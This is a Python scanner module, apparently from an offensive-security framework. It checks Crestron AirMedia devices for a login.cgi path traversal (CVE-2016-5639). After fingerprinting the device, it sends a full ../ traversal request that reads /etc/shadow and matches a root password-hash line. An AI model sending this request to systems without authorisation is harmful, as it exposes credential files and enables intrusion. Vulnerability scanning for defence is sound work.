#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Crestron AirMedia login.cgi path traversal (CVE-2016-5639)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Crestron AirMedia - login.cgi LFI Detection (CVE-2016-5639)',
        'description': (
            'Detects CVE-2016-5639 by requesting login.cgi?src=../../../../etc/shadow '
            'on Crestron AirMedia devices.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2016', 'crestron', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2016-5639',
        ],
        'cve': 'CVE-2016-5639',
    }

    def run(self):
        probe = self.http_request(
            method='GET',
            path='/cgi-bin/login.cgi?lang=en&src=AwLoginDownload.html',
            allow_redirects=False,
        )
        if not probe:
            return False
        body = probe.text or ''
        if '<title>Crestron AirMedia</title>' not in body:
            return False
        path = (
            '/cgi-bin/login.cgi?lang=en&src='
            + '../../../../../../../../../../../../../../../../../../../../etc/shadow'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:0:99999:7:::', r.text or ''):
            self.set_info(
                severity='high',
                reason='Crestron AirMedia LFI (CVE-2016-5639)',
                path='/cgi-bin/login.cgi',
            )
            return True
        return False
